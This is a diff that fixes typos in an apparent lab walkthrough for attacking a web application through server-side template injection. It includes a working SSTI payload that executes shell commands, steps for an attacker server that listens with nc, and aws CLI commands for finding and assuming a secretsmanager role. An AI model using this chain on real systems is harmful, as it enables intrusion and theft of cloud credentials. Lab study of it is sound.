@@ -1,10 +1,10 @@
-1. Acccess and exploit given web application with SSTI vulnerability
+1. Access and exploit given web application with SSTI vulnerability
 
     ```html
     <div>{{''.__class__.__mro__[1].__subclasses__()[349]('ls',shell=True,stdout=-1).communicate()}}</div>
     ```
 
-2. Prepare an EC2 instance which will serve as attaccker's server
+2. Prepare an EC2 instance which will serve as attacker's server
    - Allow TCP traffic from victim's server coming to port `4444` in Security group
    - open port `4444` using `nc`
    -  you may use other port instead of `4444`
@@ -29,7 +29,7 @@
    - Look for role which contains  `secretsmanager`
 
     ```bash
-    aws iam list-attached-role-policcies --role-name name_of_role_you_want
+    aws iam list-attached-role-policies --role-name name_of_role_you_want
     ```
 6. Assume role
 
